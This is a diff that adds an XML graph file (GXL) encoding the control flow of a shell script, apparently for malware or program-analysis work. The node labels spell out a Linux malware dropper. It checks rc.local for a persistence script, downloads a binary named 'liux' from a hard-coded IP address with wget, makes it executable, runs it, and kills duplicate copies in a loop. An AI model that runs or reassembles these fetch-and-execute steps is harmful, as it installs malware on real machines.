@@ -1,0 +1,606 @@
+<?xml version="1.0" encoding="iso-8859-1"?>
+<gxl>
+	<graph id="G_0" edgeids="true" edgemode="directed">
+		<attr name="name">
+			<string>%1</string>
+		</attr>
+		<node id="N_0">
+			<attr name="name">
+				<string>12</string>
+			</attr>
+			<attr name="label">
+				<string> cat /etc/rc.local</string>
+			</attr>
+		</node>
+		<edge from="N_0" to="N_1" isdirected="true" id="N_0--N_1">
+		</edge>
+		<node id="N_1">
+			<attr name="name">
+				<string>16</string>
+			</attr>
+			<attr name="label">
+				<string> grep /etc/chongfu.sh</string>
+			</attr>
+		</node>
+		<edge from="N_1" to="N_2" isdirected="true" id="N_1--N_2">
+		</edge>
+		<node id="N_2">
+			<attr name="name">
+				<string>20</string>
+			</attr>
+			<attr name="label">
+				<string> grep &#45;v grep</string>
+			</attr>
+		</node>
+		<edge from="N_2" to="N_3" isdirected="true" id="N_2--N_3">
+		</edge>
+		<edge from="N_2" to="N_4" isdirected="true" id="N_2--N_4">
+		</edge>
+		<edge from="N_2" to="N_5" isdirected="true" id="N_2--N_5">
+		</edge>
+		<node id="N_3">
+			<attr name="name">
+				<string>27</string>
+			</attr>
+			<attr name="label">
+				<string> echo </string>
+			</attr>
+		</node>
+		<edge from="N_3" to="N_5" isdirected="true" id="N_3--N_5">
+		</edge>
+		<node id="N_4">
+			<attr name="name">
+				<string>31</string>
+			</attr>
+			<attr name="label">
+				<string> echo sh /etc/chongfu.sh &amp; </string>
+			</attr>
+		</node>
+		<edge from="N_4" to="N_5" isdirected="true" id="N_4--N_5">
+		</edge>
+		<node id="N_5">
+			<attr name="name">
+				<string>41</string>
+			</attr>
+			<attr name="label">
+				<string> \[ 1 \]</string>
+			</attr>
+		</node>
+		<edge from="N_5" to="N_7" isdirected="true" id="N_5--N_7">
+		</edge>
+		<node id="N_6">
+			<attr name="name">
+				<string>392</string>
+			</attr>
+			<attr name="label">
+				<string> sleep 999</string>
+			</attr>
+		</node>
+		<edge from="N_6" to="N_5" isdirected="true" id="N_6--N_5">
+		</edge>
+		<node id="N_7">
+			<attr name="name">
+				<string>52</string>
+			</attr>
+			<attr name="label">
+				<string> ps aux</string>
+			</attr>
+		</node>
+		<edge from="N_7" to="N_8" isdirected="true" id="N_7--N_8">
+		</edge>
+		<node id="N_8">
+			<attr name="name">
+				<string>56</string>
+			</attr>
+			<attr name="label">
+				<string> grep /tmp/liux</string>
+			</attr>
+		</node>
+		<edge from="N_8" to="N_9" isdirected="true" id="N_8--N_9">
+		</edge>
+		<node id="N_9">
+			<attr name="name">
+				<string>60</string>
+			</attr>
+			<attr name="label">
+				<string> grep &#45;v grep</string>
+			</attr>
+		</node>
+		<edge from="N_9" to="N_10" isdirected="true" id="N_9--N_10">
+		</edge>
+		<node id="N_10">
+			<attr name="name">
+				<string>65</string>
+			</attr>
+			<attr name="label">
+				<string> wc &#45;l</string>
+			</attr>
+		</node>
+		<edge from="N_10" to="N_11" isdirected="true" id="N_10--N_11">
+		</edge>
+		<node id="N_11">
+			<attr name="name">
+				<string>73</string>
+			</attr>
+			<attr name="label">
+				<string> \[ $Centos_sshd_killn &#45;eq 0 \]</string>
+			</attr>
+		</node>
+		<edge from="N_11" to="N_12" isdirected="true" id="N_11--N_12">
+		</edge>
+		<edge from="N_11" to="N_13" isdirected="true" id="N_11--N_13">
+		</edge>
+		<node id="N_12">
+			<attr name="name">
+				<string>87</string>
+			</attr>
+			<attr name="label">
+				<string> \[ ! &#45;f /tmp/liux \]</string>
+			</attr>
+		</node>
+		<edge from="N_12" to="N_14" isdirected="true" id="N_12--N_14">
+		</edge>
+		<edge from="N_12" to="N_15" isdirected="true" id="N_12--N_15">
+		</edge>
+		<node id="N_13">
+			<attr name="name">
+				<string>147</string>
+			</attr>
+			<attr name="label">
+				<string> \[ $Centos_sshd_killn &#45;gt 1 \]</string>
+			</attr>
+		</node>
+		<edge from="N_13" to="N_22" isdirected="true" id="N_13--N_22">
+		</edge>
+		<edge from="N_13" to="N_23" isdirected="true" id="N_13--N_23">
+		</edge>
+		<edge from="N_13" to="N_24" isdirected="true" id="N_13--N_24">
+		</edge>
+		<node id="N_14">
+			<attr name="name">
+				<string>99</string>
+			</attr>
+			<attr name="label">
+				<string> \[ &#45;f /usr/bin/wget \]</string>
+			</attr>
+		</node>
+		<edge from="N_14" to="N_15" isdirected="true" id="N_14--N_15">
+		</edge>
+		<edge from="N_14" to="N_16" isdirected="true" id="N_14--N_16">
+		</edge>
+		<edge from="N_14" to="N_17" isdirected="true" id="N_14--N_17">
+		</edge>
+		<node id="N_15">
+			<attr name="name">
+				<string>142</string>
+			</attr>
+			<attr name="label">
+				<string> /tmp/liux</string>
+			</attr>
+		</node>
+		<edge from="N_15" to="N_24" isdirected="true" id="N_15--N_24">
+		</edge>
+		<node id="N_16">
+			<attr name="name">
+				<string>107</string>
+			</attr>
+			<attr name="label">
+				<string> cp /usr/bin/wget .</string>
+			</attr>
+		</node>
+		<edge from="N_16" to="N_18" isdirected="true" id="N_16--N_18">
+		</edge>
+		<node id="N_17">
+			<attr name="name">
+				<string>136</string>
+			</attr>
+			<attr name="label">
+				<string> echo No wget</string>
+			</attr>
+		</node>
+		<edge from="N_17" to="N_15" isdirected="true" id="N_17--N_15">
+		</edge>
+		<node id="N_18">
+			<attr name="name">
+				<string>112</string>
+			</attr>
+			<attr name="label">
+				<string> chmod +x wget</string>
+			</attr>
+		</node>
+		<edge from="N_18" to="N_19" isdirected="true" id="N_18--N_19">
+		</edge>
+		<node id="N_19">
+			<attr name="name">
+				<string>117</string>
+			</attr>
+			<attr name="label">
+				<string> ./wget &#45;P /tmp/ http://60.250.99.131:9998/liux </string>
+			</attr>
+		</node>
+		<edge from="N_19" to="N_20" isdirected="true" id="N_19--N_20">
+		</edge>
+		<node id="N_20">
+			<attr name="name">
+				<string>125</string>
+			</attr>
+			<attr name="label">
+				<string> chmod 755 /tmp/liux</string>
+			</attr>
+		</node>
+		<edge from="N_20" to="N_21" isdirected="true" id="N_20--N_21">
+		</edge>
+		<node id="N_21">
+			<attr name="name">
+				<string>130</string>
+			</attr>
+			<attr name="label">
+				<string> rm wget &#45;rf</string>
+			</attr>
+		</node>
+		<edge from="N_21" to="N_15" isdirected="true" id="N_21--N_15">
+		</edge>
+		<node id="N_22">
+			<attr name="name">
+				<string>164</string>
+			</attr>
+			<attr name="label">
+				<string> ps aux</string>
+			</attr>
+		</node>
+		<edge from="N_22" to="N_25" isdirected="true" id="N_22--N_25">
+		</edge>
+		<node id="N_23">
+			<attr name="name">
+				<string>215</string>
+			</attr>
+			<attr name="label">
+				<string> echo </string>
+			</attr>
+		</node>
+		<edge from="N_23" to="N_24" isdirected="true" id="N_23--N_24">
+		</edge>
+		<node id="N_24">
+			<attr name="name">
+				<string>224</string>
+			</attr>
+			<attr name="label">
+				<string> ps aux</string>
+			</attr>
+		</node>
+		<edge from="N_24" to="N_32" isdirected="true" id="N_24--N_32">
+		</edge>
+		<node id="N_25">
+			<attr name="name">
+				<string>168</string>
+			</attr>
+			<attr name="label">
+				<string> grep liux</string>
+			</attr>
+		</node>
+		<edge from="N_25" to="N_26" isdirected="true" id="N_25--N_26">
+		</edge>
+		<node id="N_26">
+			<attr name="name">
+				<string>172</string>
+			</attr>
+			<attr name="label">
+				<string> grep &#45;v grep</string>
+			</attr>
+		</node>
+		<edge from="N_26" to="N_27" isdirected="true" id="N_26--N_27">
+		</edge>
+		<node id="N_27">
+			<attr name="name">
+				<string>177</string>
+			</attr>
+			<attr name="label">
+				<string> awk {print $2}</string>
+			</attr>
+		</node>
+		<edge from="N_27" to="N_29" isdirected="true" id="N_27--N_29">
+		</edge>
+		<node id="N_28">
+			<attr name="name">
+				<string>206</string>
+			</attr>
+			<attr name="label">
+				<string> kill &#45;9 $killed</string>
+			</attr>
+		</node>
+		<edge from="N_28" to="N_24" isdirected="true" id="N_28--N_24">
+		</edge>
+		<edge from="N_28" to="N_29" isdirected="true" id="N_28--N_29">
+		</edge>
+		<node id="N_29">
+			<attr name="name">
+				<string>186</string>
+			</attr>
+			<attr name="label">
+				<string> $Centos_sshd_killn&#45;1</string>
+			</attr>
+		</node>
+		<edge from="N_29" to="N_30" isdirected="true" id="N_29--N_30">
+		</edge>
+		<node id="N_30">
+			<attr name="name">
+				<string>194</string>
+			</attr>
+			<attr name="label">
+				<string> \[ $Centos_sshd_killn &#45;eq 1 \]</string>
+			</attr>
+		</node>
+		<edge from="N_30" to="N_24" isdirected="true" id="N_30--N_24">
+		</edge>
+		<edge from="N_30" to="N_28" isdirected="true" id="N_30--N_28">
+		</edge>
+		<edge from="N_30" to="N_29" isdirected="true" id="N_30--N_29">
+		</edge>
+		<edge from="N_30" to="N_31" isdirected="true" id="N_30--N_31">
+		</edge>
+		<node id="N_31">
+			<attr name="name">
+				<string>203</string>
+			</attr>
+			<attr name="label">
+				<string> continue</string>
+			</attr>
+		</node>
+		<edge from="N_31" to="N_24" isdirected="true" id="N_31--N_24">
+		</edge>
+		<edge from="N_31" to="N_29" isdirected="true" id="N_31--N_29">
+		</edge>
+		<node id="N_32">
+			<attr name="name">
+				<string>228</string>
+			</attr>
+			<attr name="label">
+				<string> grep /tmp/liux</string>
+			</attr>
+		</node>
+		<edge from="N_32" to="N_33" isdirected="true" id="N_32--N_33">
+		</edge>
+		<node id="N_33">
+			<attr name="name">
+				<string>232</string>
+			</attr>
+			<attr name="label">
+				<string> grep &#45;v grep</string>
+			</attr>
+		</node>
+		<edge from="N_33" to="N_34" isdirected="true" id="N_33--N_34">
+		</edge>
+		<node id="N_34">
+			<attr name="name">
+				<string>237</string>
+			</attr>
+			<attr name="label">
+				<string> wc &#45;l</string>
+			</attr>
+		</node>
+		<edge from="N_34" to="N_35" isdirected="true" id="N_34--N_35">
+		</edge>
+		<node id="N_35">
+			<attr name="name">
+				<string>245</string>
+			</attr>
+			<attr name="label">
+				<string> \[ $Centos_ssh_killn &#45;eq 0 \]</string>
+			</attr>
+		</node>
+		<edge from="N_35" to="N_36" isdirected="true" id="N_35--N_36">
+		</edge>
+		<edge from="N_35" to="N_37" isdirected="true" id="N_35--N_37">
+		</edge>
+		<node id="N_36">
+			<attr name="name">
+				<string>259</string>
+			</attr>
+			<attr name="label">
+				<string> \[ ! &#45;f /tmp/liux \]</string>
+			</attr>
+		</node>
+		<edge from="N_36" to="N_38" isdirected="true" id="N_36--N_38">
+		</edge>
+		<edge from="N_36" to="N_39" isdirected="true" id="N_36--N_39">
+		</edge>
+		<node id="N_37">
+			<attr name="name">
+				<string>319</string>
+			</attr>
+			<attr name="label">
+				<string> \[ $Centos_ssh_killn &#45;gt 1 \]</string>
+			</attr>
+		</node>
+		<edge from="N_37" to="N_6" isdirected="true" id="N_37--N_6">
+		</edge>
+		<edge from="N_37" to="N_46" isdirected="true" id="N_37--N_46">
+		</edge>
+		<edge from="N_37" to="N_47" isdirected="true" id="N_37--N_47">
+		</edge>
+		<node id="N_38">
+			<attr name="name">
+				<string>271</string>
+			</attr>
+			<attr name="label">
+				<string> \[ &#45;f /usr/bin/wget \]</string>
+			</attr>
+		</node>
+		<edge from="N_38" to="N_39" isdirected="true" id="N_38--N_39">
+		</edge>
+		<edge from="N_38" to="N_40" isdirected="true" id="N_38--N_40">
+		</edge>
+		<edge from="N_38" to="N_41" isdirected="true" id="N_38--N_41">
+		</edge>
+		<node id="N_39">
+			<attr name="name">
+				<string>314</string>
+			</attr>
+			<attr name="label">
+				<string> /tmp/liux</string>
+			</attr>
+		</node>
+		<edge from="N_39" to="N_6" isdirected="true" id="N_39--N_6">
+		</edge>
+		<node id="N_40">
+			<attr name="name">
+				<string>279</string>
+			</attr>
+			<attr name="label">
+				<string> cp /usr/bin/wget .</string>
+			</attr>
+		</node>
+		<edge from="N_40" to="N_42" isdirected="true" id="N_40--N_42">
+		</edge>
+		<node id="N_41">
+			<attr name="name">
+				<string>308</string>
+			</attr>
+			<attr name="label">
+				<string> echo No wget</string>
+			</attr>
+		</node>
+		<edge from="N_41" to="N_39" isdirected="true" id="N_41--N_39">
+		</edge>
+		<node id="N_42">
+			<attr name="name">
+				<string>284</string>
+			</attr>
+			<attr name="label">
+				<string> chmod +x wget</string>
+			</attr>
+		</node>
+		<edge from="N_42" to="N_43" isdirected="true" id="N_42--N_43">
+		</edge>
+		<node id="N_43">
+			<attr name="name">
+				<string>289</string>
+			</attr>
+			<attr name="label">
+				<string> ./wget &#45;P /tmp/ http://60.250.99.131:9998/liux </string>
+			</attr>
+		</node>
+		<edge from="N_43" to="N_44" isdirected="true" id="N_43--N_44">
+		</edge>
+		<node id="N_44">
+			<attr name="name">
+				<string>297</string>
+			</attr>
+			<attr name="label">
+				<string> chmod 755 /tmp/liux</string>
+			</attr>
+		</node>
+		<edge from="N_44" to="N_45" isdirected="true" id="N_44--N_45">
+		</edge>
+		<node id="N_45">
+			<attr name="name">
+				<string>302</string>
+			</attr>
+			<attr name="label">
+				<string> rm wget &#45;rf</string>
+			</attr>
+		</node>
+		<edge from="N_45" to="N_39" isdirected="true" id="N_45--N_39">
+		</edge>
+		<node id="N_46">
+			<attr name="name">
+				<string>336</string>
+			</attr>
+			<attr name="label">
+				<string> ps aux</string>
+			</attr>
+		</node>
+		<edge from="N_46" to="N_48" isdirected="true" id="N_46--N_48">
+		</edge>
+		<node id="N_47">
+			<attr name="name">
+				<string>387</string>
+			</attr>
+			<attr name="label">
+				<string> echo </string>
+			</attr>
+		</node>
+		<edge from="N_47" to="N_6" isdirected="true" id="N_47--N_6">
+		</edge>
+		<node id="N_48">
+			<attr name="name">
+				<string>340</string>
+			</attr>
+			<attr name="label">
+				<string> grep liux</string>
+			</attr>
+		</node>
+		<edge from="N_48" to="N_49" isdirected="true" id="N_48--N_49">
+		</edge>
+		<node id="N_49">
+			<attr name="name">
+				<string>344</string>
+			</attr>
+			<attr name="label">
+				<string> grep &#45;v grep</string>
+			</attr>
+		</node>
+		<edge from="N_49" to="N_50" isdirected="true" id="N_49--N_50">
+		</edge>
+		<node id="N_50">
+			<attr name="name">
+				<string>349</string>
+			</attr>
+			<attr name="label">
+				<string> awk {print $2}</string>
+			</attr>
+		</node>
+		<edge from="N_50" to="N_52" isdirected="true" id="N_50--N_52">
+		</edge>
+		<node id="N_51">
+			<attr name="name">
+				<string>378</string>
+			</attr>
+			<attr name="label">
+				<string> kill &#45;9 $killed</string>
+			</attr>
+		</node>
+		<edge from="N_51" to="N_6" isdirected="true" id="N_51--N_6">
+		</edge>
+		<edge from="N_51" to="N_52" isdirected="true" id="N_51--N_52">
+		</edge>
+		<node id="N_52">
+			<attr name="name">
+				<string>358</string>
+			</attr>
+			<attr name="label">
+				<string> $Centos_ssh_killn</string>
+			</attr>
+		</node>
+		<edge from="N_52" to="N_53" isdirected="true" id="N_52--N_53">
+		</edge>
+		<node id="N_53">
+			<attr name="name">
+				<string>366</string>
+			</attr>
+			<attr name="label">
+				<string> \[ $Centos_ssh_killn &#45;eq 1 \]</string>
+			</attr>
+		</node>
+		<edge from="N_53" to="N_6" isdirected="true" id="N_53--N_6">
+		</edge>
+		<edge from="N_53" to="N_51" isdirected="true" id="N_53--N_51">
+		</edge>
+		<edge from="N_53" to="N_52" isdirected="true" id="N_53--N_52">
+		</edge>
+		<edge from="N_53" to="N_54" isdirected="true" id="N_53--N_54">
+		</edge>
+		<node id="N_54">
+			<attr name="name">
+				<string>375</string>
+			</attr>
+			<attr name="label">
+				<string> continue</string>
+			</attr>
+		</node>
+		<edge from="N_54" to="N_6" isdirected="true" id="N_54--N_6">
+		</edge>
+		<edge from="N_54" to="N_52" isdirected="true" id="N_54--N_52">
+		</edge>
+	</graph>
+</gxl>
